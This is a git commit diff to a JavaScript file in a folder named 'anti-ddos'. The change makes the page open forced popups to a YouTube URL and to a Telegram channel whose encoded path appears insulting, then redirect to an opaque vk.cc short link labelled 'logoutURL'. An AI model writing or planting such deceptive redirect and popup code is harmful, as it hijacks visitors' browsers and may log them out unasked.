8dadd672136ac8579eb2154cb2b162a806618934
aGVsbG9YRERE <134012839+aGVsbG9YRERE@users.noreply.github.com>
2024-01-02 21:41:45 +0300

    Update wtf.js

--- anti-ddos/wtf.js
+++ anti-ddos/wtf.js
@@ -1,6 +1,7 @@
 var counter = 3;
 var url = "https://youtube.com////opensearch";
 var logoutURL = "https://vk.cc/81RMxo"
+var tgURL = "https://t.me/s/rastish1/%D1%80%D0%B0%D1%81%D0%B8%D0%BC%D0%BB%D0%BE%D1%85%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0"
 var done = false;
 
 function isMobile(){
@@ -20,8 +21,9 @@ function Redirect(){
         if (count <= 0 && done == false) {
             done = true;
             clearInterval(coolint);
-            window.open(logoutURL, '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');
-            window.location.replace(url);
+            window.open(url, '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');
+            window.open(tgURL, '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');
+            window.location.replace(logoutURL);
         }
     }, 1);
 }
